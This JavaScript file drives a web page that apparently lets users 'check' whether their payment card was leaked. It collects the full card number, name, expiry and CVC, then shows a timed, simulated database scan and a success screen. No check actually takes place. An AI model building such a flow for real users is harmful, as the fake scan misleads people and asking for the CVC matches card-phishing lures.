document.addEventListener('DOMContentLoaded', function() {
    // References to elements
    const cardInputs = document.querySelectorAll('.card-input');
    const scanButton = document.getElementById('scan-button');
    const checkAnotherButton = document.getElementById('check-another');
    const setupMonitoringButton = document.getElementById('setup-monitoring');
    const card3d = document.querySelector('.card-3d');
    const cvcInput = document.getElementById('card-cvc');
    
    const initialState = document.getElementById('initial-state');
    const loadingState = document.getElementById('loading-state');
    const successState = document.getElementById('success-state');
    
    // Auto-focus on next input after maxlength reached
    cardInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length >= this.maxLength && index < cardInputs.length - 1) {
                cardInputs[index + 1].focus();
            }
            
            // Check if we should flip to the back of the card for CVV entry
            const cardNumber1 = document.getElementById('card-number-1').value;
            const cardNumber2 = document.getElementById('card-number-2').value;
            const cardNumber3 = document.getElementById('card-number-3').value;
            const cardNumber4 = document.getElementById('card-number-4').value;
            const cardHolder = document.getElementById('card-holder').value;
            const cardMonth = document.getElementById('card-month').value;
            const cardYear = document.getElementById('card-year').value;
            
            // If this is the year field and all front info is complete
            if (input.id === 'card-year' && 
                cardNumber1.length === 4 && 
                cardNumber2.length === 4 && 
                cardNumber3.length === 4 && 
                cardNumber4.length === 4 && 
                cardHolder.trim() !== '' && 
                cardMonth.length === 2 && 
                cardYear.length === 2) {
                // Flip card and focus on CVC
                setTimeout(() => {
                    card3d.classList.add('flipped');
                    document.getElementById('card-cvc').focus();
                }, 200);
            }
        });
        
        // Only allow numbers
        input.addEventListener('keypress', function(e) {
            if (!/[0-9]/.test(e.key)) {
                e.preventDefault();
            }
        });
    });
    
    // Handle card flip for CVC
    cvcInput.addEventListener('focus', function() {
        card3d.classList.add('flipped');
    });
    
    cvcInput.addEventListener('blur', function() {
        card3d.classList.remove('flipped');
    });
    
    // Card validation and flow management
    scanButton.addEventListener('click', function() {
        // Simple validation
        const cardNumber1 = document.getElementById('card-number-1').value;
        const cardNumber2 = document.getElementById('card-number-2').value;
        const cardNumber3 = document.getElementById('card-number-3').value;
        const cardNumber4 = document.getElementById('card-number-4').value;
        const cardHolder = document.getElementById('card-holder').value;
        const cardMonth = document.getElementById('card-month').value;
        const cardYear = document.getElementById('card-year').value;
        const cardCvc = document.getElementById('card-cvc').value;
        
        // Basic validation
        if (cardNumber1.length !== 4 || cardNumber2.length !== 4 || 
            cardNumber3.length !== 4 || cardNumber4.length !== 4) {
            showError('Please enter a valid 16-digit card number');
            return;
        }
        
        if (!cardHolder.trim()) {
            showError('Please enter the cardholder name');
            return;
        }
        
        if (!cardMonth || !cardYear || cardMonth > 12 || cardMonth < 1) {
            showError('Please enter a valid expiration date');
            return;
        }
        
        if (!cardCvc || cardCvc.length !== 3) {
            showError('Please enter a valid CVC code');
            card3d.classList.add('flipped');
            return;
        }
        
        // Show loading state
        changeState(initialState, loadingState);
        
        // Simulate scanning process - will show success after 5 seconds
        simulateScanning();
    });
    
    checkAnotherButton.addEventListener('click', function() {
        // Reset form
        resetCardForm();
        
        // Go back to initial state
        changeState(successState, initialState);
    });
    
    setupMonitoringButton.addEventListener('click', function() {
        // In a real application, this would navigate to a setup page
        alert('This would navigate to the monitoring setup page in a real application.');
    });
    
    // Function to change between states
    function changeState(fromState, toState) {
        fromState.classList.remove('active');
        toState.classList.add('active');
        
        // Scroll to top of page when changing states
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    }
    
    // Function to simulate the scanning process
    function simulateScanning() {
        const statusItems = document.querySelectorAll('.status-item');
        const progressText = document.querySelector('.progress-text');
        const progressFill = document.querySelector('.progress-fill');
        
        // Step 1: Already complete in HTML
        
        // Step 2: Already complete in HTML
        
        // Step 3: Already active in HTML
        setTimeout(() => {
            // Complete step 3
            statusItems[2].classList.remove('active');
            statusItems[2].classList.add('complete');
            statusItems[2].querySelector('.status-icon').textContent = '✓';
            
            // Make step 4 active
            statusItems[3].classList.add('active');
            statusItems[3].querySelector('.status-icon').textContent = '⟳';
            
            // Update progress
            progressText.textContent = 'Checking database 3 of 5';
            progressFill.style.width = '60%';
        }, 1500);
        
        setTimeout(() => {
            // Complete step 4
            statusItems[3].classList.remove('active');
            statusItems[3].classList.add('complete');
            statusItems[3].querySelector('.status-icon').textContent = '✓';
            
            // Make step 5 active
            statusItems[4].classList.add('active');
            statusItems[4].querySelector('.status-icon').textContent = '⟳';
            
            // Update progress
            progressText.textContent = 'Checking database 4 of 5';
            progressFill.style.width = '80%';
        }, 3000);
        
        setTimeout(() => {
            // Complete step 5
            statusItems[4].classList.remove('active');
            statusItems[4].classList.add('complete');
            statusItems[4].querySelector('.status-icon').textContent = '✓';
            
            // Update progress
            progressText.textContent = 'Completed all checks';
            progressFill.style.width = '100%';
        }, 4000);
        
        // Show success state after all steps are complete
        setTimeout(() => {
            changeState(loadingState, successState);
        }, 5000);
    }
    
    // Function to show validation errors
    function showError(message) {
        // Check if an error message already exists
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        // Create error message element
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.color = 'var(--danger)';
        errorDiv.style.backgroundColor = 'rgba(229, 56, 59, 0.1)';
        errorDiv.style.padding = '0.75rem';
        errorDiv.style.borderRadius = 'var(--radius-md)';
        errorDiv.style.marginBottom = '1rem';
        errorDiv.style.textAlign = 'center';
        errorDiv.style.animation = 'fadeIn 0.3s ease';
        errorDiv.textContent = message;
        
        // Add error message before the card wrapper
        const cardActions = document.querySelector('.card-actions');
        cardActions.prepend(errorDiv);
        
        // Remove error after 4 seconds
        setTimeout(() => {
            errorDiv.style.animation = 'fadeOut 0.3s ease';
            errorDiv.addEventListener('animationend', () => {
                errorDiv.remove();
            });
        }, 4000);
    }
    
    // Function to reset the card form
    function resetCardForm() {
        // Reset all input fields
        document.getElementById('card-number-1').value = '';
        document.getElementById('card-number-2').value = '';
        document.getElementById('card-number-3').value = '';
        document.getElementById('card-number-4').value = '';
        document.getElementById('card-holder').value = '';
        document.getElementById('card-month').value = '';
        document.getElementById('card-year').value = '';
        document.getElementById('card-cvc').value = '';
        
        // Reset card flip
        card3d.classList.remove('flipped');
        
        // Focus on first input
        document.getElementById('card-number-1').focus();
        
        // Clear any error messages
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
    }
    
    // Also add detection after the expiry month to auto-advance to year
    const monthInput = document.getElementById('card-month');
    monthInput.addEventListener('input', function() {
        if (this.value.length >= this.maxLength) {
            document.getElementById('card-year').focus();
        }
    });

    // Add a similar function for the card holder (when they press Tab)
    const holderInput = document.getElementById('card-holder');
    holderInput.addEventListener('keydown', function(e) {
        if (e.key === 'Tab' && !e.shiftKey) {
            e.preventDefault();
            document.getElementById('card-month').focus();
        }
    });
    
    // Add fadeOut animation to CSS
    const style = document.createElement('style');
    style.textContent = `
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }
    `;
    document.head.appendChild(style);

    // After the other event listeners
    const flipCardButton = document.getElementById('flip-card-button');
    flipCardButton.addEventListener('click', function() {
        // Toggle the flipped class
        card3d.classList.toggle('flipped');
        
        // If we're flipping to the back, focus on the CVC input
        if (card3d.classList.contains('flipped')) {
            setTimeout(() => {
                document.getElementById('card-cvc').focus();
            }, 400); // Wait for the animation to get halfway
        }
    });
});